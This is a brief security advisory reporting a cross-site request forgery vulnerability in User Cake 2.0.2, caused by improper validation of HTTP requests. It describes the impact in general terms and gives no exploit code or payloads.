User Cake is prone to a cross-site request-forgery vulnerability because it does not properly validate HTTP requests.

An attacker can exploit this issue to perform unauthorized actions in the context of a logged-in user of the affected application. This may aid in other attacks.

User Cake 2.0.2 is vulnerable; prior versions may also be affected.
